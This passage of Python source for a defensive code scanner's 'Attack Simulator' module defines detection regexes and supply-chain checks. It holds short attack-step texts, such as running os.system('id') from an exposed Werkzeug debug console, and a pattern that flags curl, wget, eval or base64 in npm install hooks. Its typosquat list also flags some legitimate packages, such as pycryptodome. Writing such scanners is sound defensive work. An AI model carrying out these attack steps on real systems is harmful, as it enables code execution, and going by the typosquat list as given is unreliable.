            "Werkzeug interactive debugger exposes a Python console on errors."
        ),
        recommendation=(
            "Set DEBUG=False in production. "
            "Use environment-based configuration: debug=os.getenv('FLASK_DEBUG', 'False') == 'True'\n"
            "The Werkzeug debugger console is accessible without authentication and allows RCE."
        ),
        cwe_id="CWE-94",
        attack_simulation=(
            "ATTACK VECTOR: Trigger any unhandled exception in debug mode\n"
            "STEPS:\n"
            "  1. Send malformed request to trigger a 500 error\n"
            "  2. Werkzeug interactive debugger appears in browser\n"
            "  3. Click any frame in the traceback to open a Python console\n"
            "  4. Execute: import os; os.system('id')\n"
            "IMPACT: Full Remote Code Execution directly from the browser — no credentials needed."
        ),
    ),

    # ── RACE CONDITION ────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Race Condition / Time-of-Check Time-of-Use (TOCTOU)",
        severity=Severity.MEDIUM,
        category=Category.BROKEN_ACCESS,
        pattern=r"""(?:os\.path\.exists|os\.access)\s*\(.*?\)[\s\S]{0,100}(?:open|shutil\.|os\.rename|os\.remove)\s*\(""",
        context_exclude=r"lock|mutex|transaction|atomic|with_for_update",
        description=(
            "SIMULATED ATTACK: File existence check followed by file operation without locking "
            "— attacker can swap the file between the check and use."
        ),
        recommendation=(
            "Use atomic operations — open with O_EXCL flag, or database transactions with SELECT FOR UPDATE. "
            "Avoid check-then-act patterns; use try/except instead of pre-checking existence."
        ),
        cwe_id="CWE-367",
        attack_simulation=(
            "ATTACK VECTOR: Race between check (os.path.exists) and use (open/rename)\n"
            "METHOD: Send many parallel requests to exploit the race window\n"
            "TOOL: Turbo Intruder (Burp Suite) for simultaneous request timing\n"
            "IMPACT: Double-spend (multiple withdrawals), symlink attacks reading privileged files."
        ),
    ),
]


class AttackSimulator(BaseScanner):
    name = "Attack Simulator"

    def scan(self) -> ScanResult:
        start = time.time()
        result = ScanResult(scanner_name=self.name)
        reported: set[tuple[str, int, str]] = set()

        self._run_patterns(result, reported)
        self._simulate_supply_chain(result)

        result.scan_time_seconds = time.time() - start
        return result

    def _iter_code_files(self, extensions=None):
        if extensions is None:
            extensions = CODE_EXTS
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in extensions:
                    continue
                fpath = os.path.join(root, fname)
                try:
                    if os.path.getsize(fpath) > MAX_FILE_SIZE:
                        continue
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    yield fpath, content, content.split("\n")
                except (OSError, PermissionError):
                    continue

    def _run_patterns(self, result: ScanResult, reported: set):
        for ap in ATTACK_PATTERNS:
            exts = ap.extensions or CODE_EXTS
            for fpath, content, lines in self._iter_code_files(exts):
                rel = os.path.relpath(fpath, self.target_path)
                result.files_scanned += 1

                try:
                    compiled = re.compile(ap.pattern, re.IGNORECASE)
                except re.error:
                    continue

                for i, line in enumerate(lines, 1):
                    if not compiled.search(line):
                        continue

                    # Suppression checks
                    if any(re.search(sup, line, re.IGNORECASE) for sup in ap.suppress):
                        continue

                    # Context window checks
                    ctx_start = max(0, i - ap.context_lines - 1)
                    ctx_end = min(len(lines), i + ap.context_lines)
                    context = "\n".join(lines[ctx_start:ctx_end])

                    if ap.context_require and not re.search(ap.context_require, context, re.IGNORECASE):
                        continue
                    if ap.context_exclude and re.search(ap.context_exclude, context, re.IGNORECASE):
                        continue

                    key = (rel, i, ap.title)
                    if key in reported:
                        continue
                    reported.add(key)

                    result.findings.append(Finding(
                        title=ap.title,
                        severity=ap.severity,
                        category=ap.category,
                        file_path=rel,
                        line_number=i,
                        code_snippet=line.strip()[:200],
                        description=ap.description,
                        recommendation=ap.recommendation,
                        cwe_id=ap.cwe_id,
                        attack_simulation=ap.attack_simulation,
                    ))

    def _simulate_supply_chain(self, result: ScanResult):
        """Supply chain attack detection."""
        self._check_npm_supply_chain(result)
        self._check_pypi_supply_chain(result)

    def _check_npm_supply_chain(self, result: ScanResult):
        pkg_json_path = os.path.join(self.target_path, "package.json")
        if not os.path.isfile(pkg_json_path):
            return
        try:
            with open(pkg_json_path, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
        except Exception:
            return

        # Git/URL dependencies — unversioned, unverifiable
        for section in ("dependencies", "devDependencies", "optionalDependencies"):
            for pkg, ver in data.get(section, {}).items():
                if re.match(r"(?:git|github|gitlab|bitbucket|http|https|file|ssh):", str(ver)):
                    result.findings.append(Finding(
                        title="[ATTACK SIM] Supply Chain: Unregistered Git/URL Dependency",
                        severity=Severity.MEDIUM,
                        category=Category.VULNERABLE_COMPONENTS,
                        file_path="package.json",
                        line_number=None,
                        code_snippet=f'"{pkg}": "{str(ver)[:80]}"',
                        description=(
                            "SIMULATED ATTACK: Dependency loaded from git/URL — "
                            "if that repository is compromised, malicious code runs on install."
                        ),
                        recommendation=(
                            "Use published npm packages pinned to a specific version. "
                            "If a git dep is necessary, pin to a full SHA commit hash, not a branch."
                        ),
                        cwe_id="CWE-829",
                        attack_simulation=(
                            "ATTACK VECTOR: Attacker gains write access to the referenced git repository\n"
                            "METHOD: Push malicious code to branch/tag used in dependency\n"
                            "IMPACT: postinstall script runs attacker code on every npm install.\n"
                            "SCALE: All developers and CI/CD pipelines installing the package are compromised."
                        ),
                    ))

        # Dangerous lifecycle scripts
        for pkg_root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            if "package.json" not in files:
                continue
            fpath = os.path.join(pkg_root, "package.json")
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    pkg = json.load(f)
            except Exception:
                continue
            rel = os.path.relpath(fpath, self.target_path)
            for hook in ("preinstall", "postinstall", "prepare", "preuninstall"):
                cmd = pkg.get("scripts", {}).get(hook, "")
                if cmd and re.search(r"(?:curl|wget|node\s+-e|eval|exec|base64)", cmd, re.IGNORECASE):
                    result.findings.append(Finding(
                        title=f"[ATTACK SIM] Supply Chain: Suspicious Lifecycle Script ({hook})",
                        severity=Severity.HIGH,
                        category=Category.INJECTION,
                        file_path=rel,
                        line_number=None,
                        code_snippet=f'"{hook}": "{cmd[:120]}"',
                        description=(
                            f"SIMULATED ATTACK: npm lifecycle hook '{hook}' downloads or executes remote code — "
                            "classic supply chain attack vector used in real npm malware campaigns."
                        ),
                        recommendation=(
                            "Audit the script content. Remove network calls from install hooks. "
                            "Run npm install --ignore-scripts for untrusted packages."
                        ),
                        cwe_id="CWE-94",
                        attack_simulation=(
                            "REAL WORLD: event-stream 2018, node-ipc 2022, ua-parser-js 2021\n"
                            "ATTACK: Maintainer account compromised → malicious code added to postinstall\n"
                            "IMPACT: Code runs automatically on every npm install, CI/CD, Docker build.\n"
                            "SCALE: Can affect millions of downstream projects within hours."
                        ),
                    ))

    def _check_pypi_supply_chain(self, result: ScanResult):
        """Check for typosquatting risk and suspicious Python deps."""
        # Known typosquatted / malicious package names that have appeared on PyPI
        KNOWN_TYPOSQUATS = {
            "colourama": "colorama",
            "djanga": "django",
            "diango": "django",
            "flassk": "flask",
            "requestes": "requests",
            "reqeusts": "requests",
            "urllib4": "urllib3",
            "python-jwt": "PyJWT",
            "jsonwebtoken": "PyJWT",
            "pycryptodome": None,  # legit but often confused with pycrypto (abandoned)
            "setup-tools": "setuptools",
            "openssl": "pyOpenSSL",
        }

        req_files = []
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for fname in files:
                if fname in ("requirements.txt", "requirements-dev.txt", "requirements-prod.txt"):
                    req_files.append(os.path.join(root, fname))

        for req_path in req_files:
            rel = os.path.relpath(req_path, self.target_path)
            try:
                with open(req_path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()
            except OSError:
                continue

            for i, line in enumerate(lines, 1):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                pkg_name = re.split(r"[>=<!;\[]", line)[0].strip().lower()
                if pkg_name in KNOWN_TYPOSQUATS:
                    legit = KNOWN_TYPOSQUATS[pkg_name]
                    msg = f"Possible typosquatted package '{pkg_name}'"
                    if legit:
                        msg += f" — did you mean '{legit}'?"
                    result.findings.append(Finding(
                        title=f"[ATTACK SIM] Supply Chain: Possible Typosquatted Package",
                        severity=Severity.HIGH,
                        category=Category.VULNERABLE_COMPONENTS,
                        file_path=rel,
                        line_number=i,
                        code_snippet=line[:120],
                        description=(
                            f"SIMULATED ATTACK: {msg} "
                            "Typosquatted packages on PyPI often contain credential stealers."
                        ),
                        recommendation=(
                            f"Verify the package name against PyPI. "
                            f"{'Use ' + legit + ' instead.' if legit else 'Use the canonical package name.'}"
                        ),
                        cwe_id="CWE-829",
                        attack_simulation=(
                            "REAL WORLD: colourama (2018), python-urllib3 vs urllib3, ctx (2022)\n"
                            "ATTACK: Developer makes typo — installs malicious look-alike package\n"
                            "PAYLOAD: setup.py steals env vars, SSH keys, AWS credentials on install\n"
                            "IMPACT: All developer machines and CI/CD pipelines compromised."
                        ),
                    ))
